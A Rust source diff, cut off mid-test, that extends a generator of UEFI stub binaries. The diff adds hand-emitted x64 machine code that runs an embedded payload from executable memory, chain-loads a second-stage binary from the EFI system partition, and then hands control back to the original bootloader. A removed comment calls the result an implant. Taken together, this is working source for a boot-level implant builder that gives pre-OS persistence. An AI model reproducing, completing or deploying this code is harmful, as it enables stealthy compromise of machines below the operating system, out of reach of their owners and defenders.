@@ -56,6 +56,27 @@ const IMAGE_SUBSYSTEM_EFI_APPLICATION: u16 = 10;
 /// IMAGE_FILE_MACHINE_AMD64.
 const IMAGE_FILE_MACHINE_AMD64: u16 = 0x8664;
 
+/// IMAGE_FILE_MACHINE_ARM64.
+const IMAGE_FILE_MACHINE_ARM64: u16 = 0xAA64;
+
+/// EFI_GUID size in bytes.
+const EFI_GUID_SIZE: usize = 16;
+
+/// EFI_LOADED_IMAGE_PROTOCOL GUID: {5B1B31A1-9562-11D2-8E3F-00A0C969723B}
+/// in little-endian wire format (UEFI spec layout).
+const EFI_LOADED_IMAGE_PROTOCOL_GUID: [u8; EFI_GUID_SIZE] = [
+    0xA1, 0x31, 0x1B, 0x5B, 0x62, 0x95, 0xD2, 0x11, 0x8E, 0x3F, 0x00, 0xA0, 0xC9, 0x69, 0x72,
+    0x3B,
+];
+
+/// EFI_BOOT_SERVICES offsets used by the x64 entry stub.
+const EFI_BOOT_SERVICES_LOAD_IMAGE_OFFSET: u32 = 0x00C8;
+const EFI_BOOT_SERVICES_START_IMAGE_OFFSET: u32 = 0x00D0;
+const EFI_BOOT_SERVICES_OPEN_PROTOCOL_OFFSET: u32 = 0x0118;
+
+/// EFI_OPEN_PROTOCOL_BY_HANDLE_PROTOCOL attribute value.
+const EFI_OPEN_PROTOCOL_BY_HANDLE_PROTOCOL: u32 = 0x00000020;
+
 /// IMAGE_FILE_EXECUTABLE_IMAGE.
 const IMAGE_FILE_EXECUTABLE_IMAGE: u16 = 0x0002;
 
@@ -100,6 +121,185 @@ pub struct EfiStubResult {
     pub rdata_section_size: u32,
 }
 
+#[derive(Debug, Clone, Copy)]
+struct RipRelativePatch {
+    displacement_offset: usize,
+    rip_after_offset: usize,
+}
+
+#[derive(Debug, Clone, Copy)]
+struct PathImageLoaderPatches {
+    device_path_patch: RipRelativePatch,
+    loaded_image_guid_patch: RipRelativePatch,
+}
+
+struct TextSectionBuild {
+    bytes: Vec<u8>,
+    embedded_payload_patch: Option<RipRelativePatch>,
+    second_stage_patch: Option<PathImageLoaderPatches>,
+    original_bootloader_patch: Option<PathImageLoaderPatches>,
+}
+
+fn patch_rip_relative_i32(
+    text: &mut [u8],
+    patch: RipRelativePatch,
+    text_rva: u32,
+    target_rva: u32,
+    label: &str,
+) -> Result<()> {
+    let end = patch
+        .displacement_offset
+        .checked_add(4)
+        .context("RIP-relative patch offset overflow")?;
+    if end > text.len() {
+        bail!(
+            "{label} displacement offset {} is outside .text size {}",
+            patch.displacement_offset,
+            text.len()
+        );
+    }
+
+    let rip_after = text_rva as i64 + patch.rip_after_offset as i64;
+    let displacement = target_rva as i64 - rip_after;
+    let displacement = i32::try_from(displacement)
+        .with_context(|| format!("{label} RIP-relative displacement out of i32 range"))?;
+    text[patch.displacement_offset..end].copy_from_slice(&displacement.to_le_bytes());
+    Ok(())
+}
+
+fn emit_jnz_rel32_placeholder(text: &mut Vec<u8>) -> usize {
+    text.extend_from_slice(&[0x0F, 0x85]);
+    let displacement_offset = text.len();
+    text.extend_from_slice(&0i32.to_le_bytes());
+    displacement_offset
+}
+
+fn emit_jz_rel32_placeholder(text: &mut Vec<u8>) -> usize {
+    text.extend_from_slice(&[0x0F, 0x84]);
+    let displacement_offset = text.len();
+    text.extend_from_slice(&0i32.to_le_bytes());
+    displacement_offset
+}
+
+fn patch_relative_jump(
+    text: &mut [u8],
+    displacement_offset: usize,
+    target_offset: usize,
+) -> Result<()> {
+    let end = displacement_offset
+        .checked_add(4)
+        .context("relative jump offset overflow")?;
+    if end > text.len() || target_offset > text.len() {
+        bail!(
+            "relative jump patch out of range (disp={}, target={}, len={})",
+            displacement_offset,
+            target_offset,
+            text.len()
+        );
+    }
+    let rip_after = end as isize;
+    let displacement = target_offset as isize - rip_after;
+    let displacement =
+        i32::try_from(displacement).context("relative jump displacement out of i32 range")?;
+    text[displacement_offset..end].copy_from_slice(&displacement.to_le_bytes());
+    Ok(())
+}
+
+fn looks_like_pe_coff_image(payload: &[u8]) -> bool {
+    if payload.len() < 0x40 || payload.get(0..2) != Some(b"MZ") {
+        return false;
+    }
+    let e_lfanew =
+        u32::from_le_bytes([payload[0x3c], payload[0x3d], payload[0x3e], payload[0x3f]]) as usize;
+    let signature_end = match e_lfanew.checked_add(4) {
+        Some(end) => end,
+        None => return false,
+    };
+    signature_end <= payload.len() && payload[e_lfanew..signature_end] == *b"PE\0\0"
+}
+
+fn payload_pages(payload_len: usize) -> Result<u32> {
+    let pages = payload_len
+        .checked_add(EFI_PAGE_SIZE - 1)
+        .context("payload size overflow")?
+        / EFI_PAGE_SIZE;
+    u32::try_from(pages).context("payload requires more EFI pages than the x64 stub can encode")
+}
+
+fn align_up_usize(value: usize, alignment: usize) -> Result<usize> {
+    let adjusted = value
+        .checked_add(alignment - 1)
+        .context("alignment overflow")?;
+    Ok(adjusted & !(alignment - 1))
+}
+
+fn file_path_device_path_len(path: &str) -> Result<usize> {
+    let wchar_count = path.encode_utf16().count() + 1;
+    let path_bytes = wchar_count
+        .checked_mul(2)
+        .context("EFI device path byte length overflow")?;
+    let node_length = 4usize
+        .checked_add(path_bytes)
+        .context("EFI FILE_PATH node length overflow")?;
+    if node_length > u16::MAX as usize {
+        bail!("EFI FILE_PATH node is too long for path {path:?}");
+    }
+    node_length
+        .checked_add(4)
+        .context("EFI device path length overflow")
+}
+
+/// Compute the byte offset of the payload data within the .rdata section.
+///
+/// This mirrors the layout produced by `build_rdata_section` so that
+/// `build_efi_stub` can patch the correct RIP-relative displacement for the
+/// embedded payload loader in the .text entry-point stub.
+fn rdata_payload_start_offset(config: &EfiPayloadConfig) -> usize {
+    let path_bytes = config.second_stage_path.as_bytes();
+    let raw = 4 + 4 + 4 + 4 + 4 + path_bytes.len() + 1; // ORCH+ver+payload_sz+flags+path_len+path+null
+    align_up(raw as u32, 16) as usize
+}
+
+/// Compute the byte offset of the FILE_PATH device-path node within the
+/// .rdata section.
+///
+/// The device path is placed after the ORCH header and (optionally) the
+/// embedded payload data, both aligned to 16-byte boundaries.
+fn rdata_metadata_start_offset(config: &EfiPayloadConfig) -> usize {
+    let after_header = rdata_payload_start_offset(config);
+    if config.payload_data.is_empty() {
+        after_header
+    } else {
+        let raw = after_header + config.payload_data.len();
+        align_up(raw as u32, 16) as usize
+    }
+}
+
+fn rdata_loaded_image_guid_offset(config: &EfiPayloadConfig) -> usize {
+    rdata_metadata_start_offset(config)
+}
+
+fn rdata_device_path_base_offset(config: &EfiPayloadConfig) -> usize {
+    rdata_loaded_image_guid_offset(config) + align_up(EFI_GUID_SIZE as u32, 16) as usize
+}
+
+fn rdata_second_stage_device_path_offset(config: &EfiPayloadConfig) -> usize {
+    rdata_device_path_base_offset(config)
+}
+
+fn rdata_original_bootloader_device_path_offset(config: &EfiPayloadConfig) -> Result<usize> {
+    let mut offset = rdata_device_path_base_offset(config);
+    if !config.second_stage_path.is_empty() {
+        offset = offset
+            .checked_add(align_up_usize(
+                file_path_device_path_len(&config.second_stage_path)?,
+                16,
+            )?)
+            .context("original bootloader device path offset overflow")?;
+    }
+    Ok(offset)
+}
+
 /// Build a minimal EFI PE/COFF stub that can load an embedded payload.
 ///
 /// The resulting binary:
@@ -113,18 +313,39 @@ pub struct EfiStubResult {
 /// 2. Calls the payload loader.
 /// 3. Returns EFI status.
 ///
-/// The actual payload execution logic is platform-specific and would need
-/// to be implemented in a real deployment.
+/// Embedded EFI PE/COFF images are launched through BootServices->LoadImage and
+/// StartImage. Embedded raw payloads are copied into EFI_LOADER_CODE pages
+/// before execution so the stub does not jump into non-executable .rdata.
 pub fn build_efi_stub(config: &EfiPayloadConfig) -> Result<EfiStubResult> {
     // Validate configuration.
     if config.payload_data.is_empty() && config.second_stage_path.is_empty() {
         bail!("Either payload_data or second_stage_path must be provided");
     }
+    if config.payload_data.len() > u32::MAX as usize {
+        bail!("payload_data is too large for the ORCH EFI payload header");
+    }
+    if config.second_stage_path.len() > u32::MAX as usize {
+        bail!("second_stage_path is too large for the ORCH EFI payload header");
+    }
+    if !config.payload_data.is_empty()
+        && !looks_like_pe_coff_image(&config.payload_data)
+        && config.entry_point_offset as usize >= config.payload_data.len()
+    {
+        bail!(
+            "entry_point_offset {:#x} is outside raw payload size {:#x}",
+            config.entry_point_offset,
+            config.payload_data.len()
+        );
+    }
+    if config.chain_to_original && config.original_bootloader_path.is_empty() {
+        bail!("original_bootloader_path must be provided when chain_to_original is enabled");
+    }
 
     // Build the .text section (EFI entry point stub).
-    let text_section = build_text_section(config)?;
+    let text_build = build_text_section(config)?;
+    let mut text_section = text_build.bytes;
 
-    // Build the .rdata section (embedded payload + config).
+    // Build the .rdata section (embedded payload + config + device path).
     let rdata_section = build_rdata_section(config)?;
 
     // Build the .reloc section.
@@ -145,6 +366,58 @@ pub fn build_efi_stub(config: &EfiPayloadConfig) -> Result<EfiStubResult> {
     let reloc_rva = rdata_rva + align_up(rdata_size_aligned, SECTION_ALIGNMENT);
 
     let image_size = reloc_rva + align_up(reloc_size_aligned, SECTION_ALIGNMENT);
+
+    // ─── Patch RIP-relative displacements in .text ──────────────────────
+    if let Some(patch) = text_build.embedded_payload_patch {
+        let payload_rva = rdata_rva + rdata_payload_start_offset(config) as u32;
+        patch_rip_relative_i32(
+            &mut text_section,
+            patch,
+            text_rva,
+            payload_rva,
+            "embedded payload",
+        )?;
+    }
+
+    if let Some(patch) = text_build.second_stage_patch {
+        let guid_rva = rdata_rva + rdata_loaded_image_guid_offset(config) as u32;
+        patch_rip_relative_i32(
+            &mut text_section,
+            patch.loaded_image_guid_patch,
+            text_rva,
+            guid_rva,
+            "second-stage loaded-image protocol GUID",
+        )?;
+
+        let dp_rva = rdata_rva + rdata_second_stage_device_path_offset(config) as u32;
+        patch_rip_relative_i32(
+            &mut text_section,
+            patch.device_path_patch,
+            text_rva,
+            dp_rva,
+            "second-stage device path",
+        )?;
+    }
+
+    if let Some(patch) = text_build.original_bootloader_patch {
+        let guid_rva = rdata_rva + rdata_loaded_image_guid_offset(config) as u32;
+        patch_rip_relative_i32(
+            &mut text_section,
+            patch.loaded_image_guid_patch,
+            text_rva,
+            guid_rva,
+            "original-loader loaded-image protocol GUID",
+        )?;
+
+        let dp_rva = rdata_rva + rdata_original_bootloader_device_path_offset(config)? as u32;
+        patch_rip_relative_i32(
+            &mut text_section,
+            patch.device_path_patch,
+            text_rva,
+            dp_rva,
+            "original bootloader device path",
+        )?;
+    }
 
     // Calculate file offsets.
     let headers_file_size = align_up(
@@ -178,12 +451,12 @@ pub fn build_efi_stub(config: &EfiPayloadConfig) -> Result<EfiStubResult> {
         image_size,
         entry_point_rva,
         text_rva,
-        rdata_rva,   // base_of_data
-        rdata_rva,   // data_directory_rva
+        rdata_rva, // base_of_data
+        rdata_rva, // data_directory_rva
         reloc_rva,
         text_size_aligned,
         rdata_size_aligned,
-        0,           // size_of_uninitialized_data
+        0, // size_of_uninitialized_data
     ));
 
     // ─── Section Headers ────────────────────────────────────────────────
@@ -328,11 +601,22 @@ fn build_dos_header() -> [u8; DOS_HEADER_SIZE] {
 }
 
 /// Build the COFF header.
-fn build_coff_header(entry_point_rva: u32, _base_of_code: u32) -> [u8; 20] {
+fn target_machine_type() -> u16 {
+    #[cfg(target_arch = "aarch64")]
+    {
+        IMAGE_FILE_MACHINE_ARM64
+    }
+    #[cfg(not(target_arch = "aarch64"))]
+    {
+        IMAGE_FILE_MACHINE_AMD64
+    }
+}
+
+fn build_coff_header(_entry_point_rva: u32, _base_of_code: u32) -> [u8; 20] {
     let mut header = [0u8; 20];
 
-    // Machine: AMD64.
-    header[0..2].copy_from_slice(&IMAGE_FILE_MACHINE_AMD64.to_le_bytes());
+    // Machine: native build target architecture (x64 or ARM64).
+    header[0..2].copy_from_slice(&target_machine_type().to_le_bytes());
 
     // NumberOfSections.
     header[2..4].copy_from_slice(&NUM_SECTIONS.to_le_bytes());
@@ -519,19 +803,25 @@ fn build_section_header(
 /// The stub:
 /// 1. Saves callee-saved registers.
 /// 2. Sets up the stack frame.
-/// 3. Stores ImageHandle (rcx) and SystemTable (rdx) in .rdata.
-/// 4. Loads the payload address from .rdata.
-/// 5. Calls the payload.
-/// 6. Returns the EFI status.
+/// 3. Stores ImageHandle (rcx) and SystemTable (rdx) in registers.
+/// 4. If payload_data is an EFI PE/COFF image: uses BootServices->LoadImage
+///    with SourceBuffer/SourceSize, then StartImage.
+/// 5. If payload_data is raw code: allocates EFI_LOADER_CODE pages, copies the
+///    bytes out of .rdata, and calls entry_point_offset from executable memory.
+/// 6. If second_stage_path is provided: uses BootServices->LoadImage and
+///    StartImage to chain-load the second-stage binary from the ESP.
+/// 7. If chain_to_original is enabled: chain-loads original_bootloader_path.
+/// 8. Returns EFI_SUCCESS (0).
 ///
 /// All address calculations use RIP-relative addressing.
-fn build_text_section(config: &EfiPayloadConfig) -> Result<Vec<u8>> {
+fn build_text_section(config: &EfiPayloadConfig) -> Result<TextSectionBuild> {
     let mut text = Vec::new();
+    let mut embedded_payload_patch = None;
+    let mut second_stage_patch = None;
+    let mut original_bootloader_patch = None;
 
-    // ─── EFI Entry Point ────────────────────────────────────────────────
-    // The entry point receives:
-    //   rcx = ImageHandle
-    //   rdx = EFI_SYSTEM_TABLE*
+    // ─── EFI Entry Point prologue ───────────────────────────────────────
+    // rcx = ImageHandle, rdx = EFI_SYSTEM_TABLE*
 
     // push rbp
     text.extend_from_slice(&[0x55]);
@@ -543,58 +833,40 @@ fn build_text_section(config: &EfiPayloadConfig) -> Result<Vec<u8>> {
     text.extend_from_slice(&[0x56]);
     // push rdi
     text.extend_from_slice(&[0x57]);
-    // sub rsp, 0x20  (shadow space for UEFI ABI)
+    // push r14  (used for EFI_BOOT_SERVICES*, callee-saved in MS x64 ABI)
+    text.extend_from_slice(&[0x41, 0x56]);
+    // sub rsp, 0x20  (shadow space for UEFI MS-ABI)
     text.extend_from_slice(&[0x48, 0x83, 0xEC, 0x20]);
 
-    // Store ImageHandle (rcx) and SystemTable (rdx).
-    // mov rbx, rcx  (save ImageHandle)
+    // Save ImageHandle → rbx, SystemTable → rsi
+    // mov rbx, rcx
     text.extend_from_slice(&[0x48, 0x89, 0xCB]);
-    // mov rsi, rdx  (save SystemTable)
+    // mov rsi, rdx
     text.extend_from_slice(&[0x48, 0x89, 0xD6]);
 
     if !config.payload_data.is_empty() {
-        // Payload is embedded in .rdata. We need to call it.
-        // The payload address is at a known offset in .rdata.
-        // For now, emit a placeholder that can be patched.
-
-        // lea rdi, [rip + offset_to_payload_in_rdata]
-        // The offset will be computed at link time based on section layout.
-        // Placeholder: lea rdi, [rip+0x1000] (will be patched).
-        text.extend_from_slice(&[0x48, 0x8D, 0x3D]);
-        text.extend_from_slice(&0x1000u32.to_le_bytes()); // placeholder offset
-
-        // Call the payload:
-        // mov rcx, rbx   (ImageHandle)
-        text.extend_from_slice(&[0x48, 0x89, 0xD9]);
-        // mov rdx, rsi   (SystemTable)
-        text.extend_from_slice(&[0x48, 0x89, 0xF2]);
-        // call rdi (call payload)
-        // Actually, the payload is data, not code. In a real implant, we'd:
-        // 1. Allocate executable memory.
-        // 2. Copy the payload.
-        // 3. Make it executable.
-        // 4. Call it.
-        // For this stub, we just emit the framework.
-        // call rax (placeholder)
-        text.extend_from_slice(&[0xFF, 0xD0]); // call rax
+        embedded_payload_patch = Some(if looks_like_pe_coff_image(&config.payload_data) {
+            emit_embedded_efi_image_loader(&mut text, config.payload_data.len())?
+        } else {
+            emit_raw_payload_loader(&mut text, config)?
+        });
     }
 
     if !config.second_stage_path.is_empty() {
-        // Load second-stage driver from ESP.
-        // This would use EFI_LOADED_IMAGE_PROTOCOL + EFI_SIMPLE_FILE_SYSTEM_PROTOCOL.
-        // For now, emit NOPs as placeholder.
-        // NOP sled (8 NOPs).
-        text.extend_from_slice(&[0x90; 8]);
+        second_stage_patch = Some(emit_second_stage_loader(&mut text)?);
     }
 
-    // ─── Return ─────────────────────────────────────────────────────────
-    // EFI_SUCCESS = 0.
+    if config.chain_to_original {
+        original_bootloader_patch = Some(emit_original_bootloader_loader(&mut text)?);
+    }
+
+    // ─── Return EFI_SUCCESS ─────────────────────────────────────────────
     // xor eax, eax
     text.extend_from_slice(&[0x31, 0xC0]);
-
-    // Restore registers.
     // add rsp, 0x20
     text.extend_from_slice(&[0x48, 0x83, 0xC4, 0x20]);
+    // pop r14
+    text.extend_from_slice(&[0x41, 0x5E]);
     // pop rdi
     text.extend_from_slice(&[0x5F]);
     // pop rsi
@@ -606,12 +878,178 @@ fn build_text_section(config: &EfiPayloadConfig) -> Result<Vec<u8>> {
     // ret
     text.extend_from_slice(&[0xC3]);
 
-    // Pad to minimum alignment.
+    // Pad to 16-byte alignment.
     while text.len() % 16 != 0 {
-        text.push(0x90); // NOP
+        text.push(0x90);
     }
 
-    Ok(text)
+    Ok(TextSectionBuild {
+        bytes: text,
+        embedded_payload_patch,
+        second_stage_patch,
+        original_bootloader_patch,
+    })
+}
+
+fn emit_embedded_efi_image_loader(
+    text: &mut Vec<u8>,
+    payload_len: usize,
+) -> Result<RipRelativePatch> {
+    // LoadImage(FALSE, ImageHandle, NULL, payload, payload_len, &new_handle)
+    // followed by StartImage(new_handle, NULL, NULL).
+    text.extend_from_slice(&[0x48, 0x83, 0xEC, 0x30]);
+    text.extend_from_slice(&[0x4C, 0x8B, 0x76, 0x60]);
+    text.extend_from_slice(&[0x48, 0xB8]);
+    text.extend_from_slice(&(payload_len as u64).to_le_bytes());
+    text.extend_from_slice(&[0x48, 0x89, 0x44, 0x24, 0x20]);
+    text.extend_from_slice(&[0x48, 0x8D, 0x44, 0x24, 0x30]);
+    text.extend_from_slice(&[0x48, 0x89, 0x44, 0x24, 0x28]);
+    text.extend_from_slice(&[0x31, 0xC9]);
+    text.extend_from_slice(&[0x48, 0x89, 0xDA]);
+    text.extend_from_slice(&[0x45, 0x31, 0xC0]);
+    text.extend_from_slice(&[0x4C, 0x8D, 0x0D]);
+    let payload_patch = RipRelativePatch {
+        displacement_offset: text.len(),
+        rip_after_offset: text.len() + 4,
+    };
+    text.extend_from_slice(&0i32.to_le_bytes());
+    text.extend_from_slice(&[0x41, 0xFF, 0x96, 0xC8, 0x00, 0x00, 0x00]);
+    text.extend_from_slice(&[0x85, 0xC0]);
+    let load_failed_jump = emit_jnz_rel32_placeholder(text);
+    text.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x30]);
+    text.extend_from_slice(&[0x31, 0xD2]);
+    text.extend_from_slice(&[0x45, 0x31, 0xC0]);
+    text.extend_from_slice(&[0x41, 0xFF, 0x96, 0xD0, 0x00, 0x00, 0x00]);
+    let done = text.len();
+    patch_relative_jump(text, load_failed_jump, done)?;
+    text.extend_from_slice(&[0x48, 0x83, 0xC4, 0x30]);
+    Ok(payload_patch)
+}
+
+fn emit_raw_payload_loader(
+    text: &mut Vec<u8>,
+    config: &EfiPayloadConfig,
+) -> Result<RipRelativePatch> {
+    let pages = payload_pages(config.payload_data.len())?;
+
+    // AllocatePages(AllocateAnyPages, EfiLoaderCode, pages, &entry_buffer),
+    // copy the embedded raw bytes into the executable pages, then call
+    // entry_buffer + entry_point_offset with the normal EFI entry arguments.
+    text.extend_from_slice(&[0x48, 0x83, 0xEC, 0x30]);
+    text.extend_from_slice(&[0x4C, 0x8B, 0x76, 0x60]);
+    text.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00]);
+    text.extend_from_slice(&[0x48, 0x89, 0x74, 0x24, 0x28]);
+    text.extend_from_slice(&[0x31, 0xC9]);
+    text.extend_from_slice(&[0xBA, 0x02, 0x00, 0x00, 0x00]);
+    text.extend_from_slice(&[0x41, 0xB8]);
+    text.extend_from_slice(&pages.to_le_bytes());
+    text.extend_from_slice(&[0x4C, 0x8D, 0x4C, 0x24, 0x20]);
+    text.extend_from_slice(&[0x41, 0xFF, 0x96, 0x28, 0x00, 0x00, 0x00]);
+    text.extend_from_slice(&[0x85, 0xC0]);
+    let alloc_failed_jump = emit_jnz_rel32_placeholder(text);
+    text.extend_from_slice(&[0x48, 0x8B, 0x7C, 0x24, 0x20]);
+    text.extend_from_slice(&[0x48, 0x8D, 0x35]);
+    let payload_patch = RipRelativePatch {
+        displacement_offset: text.len(),
+        rip_after_offset: text.len() + 4,
+    };
+    text.extend_from_slice(&0i32.to_le_bytes());
+    text.extend_from_slice(&[0x48, 0xB9]);
+    text.extend_from_slice(&(config.payload_data.len() as u64).to_le_bytes());
+    text.extend_from_slice(&[0xFC, 0xF3, 0xA4]);
+    text.extend_from_slice(&[0x48, 0x8B, 0x7C, 0x24, 0x20]);
+    if config.entry_point_offset != 0 {
+        text.extend_from_slice(&[0x48, 0xB8]);
+        text.extend_from_slice(&(config.entry_point_offset as u64).to_le_bytes());
+        text.extend_from_slice(&[0x48, 0x01, 0xC7]);
+    }
+    text.extend_from_slice(&[0x48, 0x89, 0xD9]);
+    text.extend_from_slice(&[0x48, 0x8B, 0x54, 0x24, 0x28]);
+    text.extend_from_slice(&[0xFF, 0xD7]);
+    let done = text.len();
+    patch_relative_jump(text, alloc_failed_jump, done)?;
+    text.extend_from_slice(&[0x48, 0x83, 0xC4, 0x30]);
+    Ok(payload_patch)
+}
+
+fn emit_second_stage_loader(text: &mut Vec<u8>) -> Result<PathImageLoaderPatches> {
+    emit_path_image_loader(text)
+}
+
+fn emit_original_bootloader_loader(text: &mut Vec<u8>) -> Result<PathImageLoaderPatches> {
+    emit_path_image_loader(text)
+}
+
+fn emit_path_image_loader(text: &mut Vec<u8>) -> Result<PathImageLoaderPatches> {
+    // Robust chain-loader path:
+    // 1) Resolve EFI_LOADED_IMAGE_PROTOCOL via OpenProtocol(ImageHandle,...)
+    // 2) Read LoadedImage->DeviceHandle (offset 0x18)
+    // 3) Call LoadImage(FALSE, ImageHandle, DevicePath, DeviceHandle, ...)
+    // 4) StartImage(new_handle, NULL, NULL)
+    text.extend_from_slice(&[0x48, 0x83, 0xEC, 0x50]);
+    text.extend_from_slice(&[0x4C, 0x8B, 0x76, 0x60]);
+
+    // OpenProtocol(ImageHandle, &EFI_LOADED_IMAGE_PROTOCOL_GUID,
+    //              &loaded_image_iface, ImageHandle, NULL,
+    //              EFI_OPEN_PROTOCOL_BY_HANDLE_PROTOCOL)
+    text.extend_from_slice(&[0x48, 0x89, 0xD9]);
+    text.extend_from_slice(&[0x48, 0x8D, 0x15]);
+    let loaded_image_guid_patch = RipRelativePatch {
+        displacement_offset: text.len(),
+        rip_after_offset: text.len() + 4,
+    };
+    text.extend_from_slice(&0i32.to_le_bytes());
+    text.extend_from_slice(&[0x4C, 0x8D, 0x44, 0x24, 0x38]);
+    text.extend_from_slice(&[0x49, 0x89, 0xD9]);
+    text.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00]);
+    text.extend_from_slice(&[0xC7, 0x44, 0x24, 0x28]);
+    text.extend_from_slice(&EFI_OPEN_PROTOCOL_BY_HANDLE_PROTOCOL.to_le_bytes());
+    text.extend_from_slice(&[0x41, 0xFF, 0x96]);
+    text.extend_from_slice(&EFI_BOOT_SERVICES_OPEN_PROTOCOL_OFFSET.to_le_bytes());
+    text.extend_from_slice(&[0x85, 0xC0]);
+    let open_failed_jump = emit_jnz_rel32_placeholder(text);
+
+    // loaded_image_iface must be non-null.
+    text.extend_from_slice(&[0x48, 0x8B, 0x44, 0x24, 0x38]);
+    text.extend_from_slice(&[0x48, 0x85, 0xC0]);
+    let null_iface_jump = emit_jz_rel32_placeholder(text);
+
+    // r9 = LoadedImage->DeviceHandle (offset 0x18)
+    text.extend_from_slice(&[0x4C, 0x8B, 0x48, 0x18]);
+    text.extend_from_slice(&[0x4D, 0x85, 0xC9]);
+    let null_device_jump = emit_jz_rel32_placeholder(text);
+
+    // LoadImage(FALSE, ImageHandle, DevicePath, DeviceHandle, NULL, &new_handle)
+    text.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00]);
+    text.extend_from_slice(&[0x48, 0x8D, 0x44, 0x24, 0x30]);
+    text.extend_from_slice(&[0x48, 0x89, 0x44, 0x24, 0x28]);
+    text.extend_from_slice(&[0x31, 0xC9]);
+    text.extend_from_slice(&[0x48, 0x89, 0xDA]);
+    text.extend_from_slice(&[0x4C, 0x8D, 0x05]);
+    let device_path_patch = RipRelativePatch {
+        displacement_offset: text.len(),
+        rip_after_offset: text.len() + 4,
+    };
+    text.extend_from_slice(&0i32.to_le_bytes());
+    text.extend_from_slice(&[0x41, 0xFF, 0x96]);
+    text.extend_from_slice(&EFI_BOOT_SERVICES_LOAD_IMAGE_OFFSET.to_le_bytes());
+    text.extend_from_slice(&[0x85, 0xC0]);
+    let load_failed_jump = emit_jnz_rel32_placeholder(text);
+    text.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x30]);
+    text.extend_from_slice(&[0x31, 0xD2]);
+    text.extend_from_slice(&[0x45, 0x31, 0xC0]);
+    text.extend_from_slice(&[0x41, 0xFF, 0x96]);
+    text.extend_from_slice(&EFI_BOOT_SERVICES_START_IMAGE_OFFSET.to_le_bytes());
+    let done = text.len();
+    patch_relative_jump(text, open_failed_jump, done)?;
+    patch_relative_jump(text, null_iface_jump, done)?;
+    patch_relative_jump(text, null_device_jump, done)?;
+    patch_relative_jump(text, load_failed_jump, done)?;
+    text.extend_from_slice(&[0x48, 0x83, 0xC4, 0x50]);
+    Ok(PathImageLoaderPatches {
+        device_path_patch,
+        loaded_image_guid_patch,
+    })
 }
 
 /// Build the .rdata section containing the payload data and configuration.
@@ -629,7 +1067,11 @@ fn build_rdata_section(config: &EfiPayloadConfig) -> Result<Vec<u8>> {
     rdata.extend_from_slice(&(config.payload_data.len() as u32).to_le_bytes());
 
     // Flags (u32 LE): 0 = embedded payload, 1 = second-stage path.
-    let flags: u32 = if config.second_stage_path.is_empty() { 0 } else { 1 };
+    let flags: u32 = if config.second_stage_path.is_empty() {
+        0
+    } else {
+        1
+    };
     rdata.extend_from_slice(&flags.to_le_bytes());
 
     // Second-stage path length (u32 LE).
@@ -655,7 +1097,65 @@ fn build_rdata_section(config: &EfiPayloadConfig) -> Result<Vec<u8>> {
         rdata.push(0x00);
     }
 
+    // GUID blob used by the .text chain-loader to resolve
+    // EFI_LOADED_IMAGE_PROTOCOL via OpenProtocol.
+    rdata.extend_from_slice(&EFI_LOADED_IMAGE_PROTOCOL_GUID);
+
+    while rdata.len() % 16 != 0 {
+        rdata.push(0x00);
+    }
+
+    // ─── FILE_PATH Device Path Nodes ───────────────────────────────────
+    // Structure (per UEFI spec 9.3):
+    //   Media Device Path (type 4) / File Path (subtype 4):
+    //     UINT8  Type        = 0x04
+    //     UINT8  SubType     = 0x04
+    //     UINT16 Length      = 4 + 2*(wchar_count_including_null)
+    //     CHAR16 PathName[]  (UTF-16 LE, null-terminated)
+    //   End of Hardware Device Path:
+    //     UINT8  Type        = 0x7F
+    //     UINT8  SubType     = 0xFF
+    //     UINT16 Length      = 4
+    if !config.second_stage_path.is_empty() {
+        append_file_path_device_path(&mut rdata, &config.second_stage_path)?;
+    }
+
+    if config.chain_to_original {
+        append_file_path_device_path(&mut rdata, &config.original_bootloader_path)?;
+    }
+
     Ok(rdata)
+}
+
+fn append_file_path_device_path(rdata: &mut Vec<u8>, path: &str) -> Result<()> {
+    let path_utf16: Vec<u16> = path.encode_utf16().chain(std::iter::once(0u16)).collect();
+    let path_utf16_bytes = path_utf16
+        .len()
+        .checked_mul(2)
+        .context("EFI FILE_PATH byte length overflow")?;
+    let node_length_usize = 4usize
+        .checked_add(path_utf16_bytes)
+        .context("EFI FILE_PATH node length overflow")?;
+    let node_length = u16::try_from(node_length_usize)
+        .with_context(|| format!("EFI FILE_PATH node is too long for path {path:?}"))?;
+
+    rdata.push(0x04);
+    rdata.push(0x04);
+    rdata.extend_from_slice(&node_length.to_le_bytes());
+
+    for &w in &path_utf16 {
+        rdata.extend_from_slice(&w.to_le_bytes());
+    }
+
+    rdata.push(0x7F);
+    rdata.push(0xFF);
+    rdata.extend_from_slice(&4u16.to_le_bytes());
+
+    while rdata.len() % 16 != 0 {
+        rdata.push(0x00);
+    }
+
+    Ok(())
 }
 
 /// Build the .reloc section.
@@ -698,6 +1198,21 @@ mod tests {
         }
     }
 
+    fn minimal_pe_payload() -> Vec<u8> {
+        let mut payload = vec![0u8; 0x80];
+        payload[0..2].copy_from_slice(b"MZ");
+        payload[0x3c..0x40].copy_from_slice(&0x40u32.to_le_bytes());
+        payload[0x40..0x44].copy_from_slice(b"PE\0\0");
+        payload
+    }
+
+    fn utf16_path_bytes(path: &str) -> Vec<u8> {
+        path.encode_utf16()
+            .chain(std::iter::once(0u16))
+            .flat_map(u16::to_le_bytes)
+            .collect()
+    }
+
     #[test]
     fn build_efi_stub_produces_valid_pe() {
         let config = test_payload_config();
@@ -727,11 +1242,9 @@ mod tests {
         assert_eq!(subsystem, IMAGE_SUBSYSTEM_EFI_APPLICATION);
 
         // Verify machine type.
-        let machine = u16::from_le_bytes([
-            result.binary[coff_offset],
-            result.binary[coff_offset + 1],
-        ]);
-        assert_eq!(machine, IMAGE_FILE_MACHINE_AMD64);
+        let machine =
+            u16::from_le_bytes([result.binary[coff_offset], result.binary[coff_offset + 1]]);
+        assert_eq!(machine, target_machine_type());
     }
 
     #[test]
@@ -750,6 +1263,44 @@ mod tests {
             find_subsequence(&result.binary, &[0xCC; 16]),
             "Payload INT3 sled not found in binary"
         );
+
+        assert!(
+            find_subsequence(&result.binary, &[0x41, 0xFF, 0x96, 0x28, 0, 0, 0]),
